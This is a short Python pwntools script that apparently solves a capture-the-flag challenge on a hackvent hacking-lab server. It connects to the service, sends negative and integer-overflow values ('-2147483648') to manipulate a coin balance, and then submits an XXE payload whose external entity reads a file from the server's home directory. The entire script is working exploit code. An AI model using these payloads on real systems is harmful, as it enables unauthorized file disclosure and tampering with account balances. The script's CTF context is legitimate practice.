#!/usr/bin/env python

from pwn import *

jcoinz = remote('challenges.hackvent.hacking-lab.com', 3117)


def send_xml(xml_to_send):
    jcoinz.recvuntil('Action: ')
    jcoinz.sendline('2')
    jcoinz.recvuntil('Message: ')
    jcoinz.sendline(xml_to_send)
    print jcoinz.recvuntil('Action: ')

def decrease_jcoinz(jcoinz_amout):
    jcoinz.recvuntil('Action: ')
    jcoinz.sendline('1')
    jcoinz.recvuntil('send: ')
    jcoinz.sendline(jcoinz_amout)

decrease_jcoinz('-1333')
decrease_jcoinz('-2147483648')

xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?>'
xxe_payload += '<!DOCTYPE muffin_doc [ <!ELEMENT muffin_doc ANY >'
xxe_payload += '<!ENTITY xxe SYSTEM "file:///home/jcoinz/9f40461baba9bf00ba9174beeeb9b8a80c0ffba6" >]>'
xxe_payload += '<payload>&xxe;</payload>'

send_xml(xxe_payload)
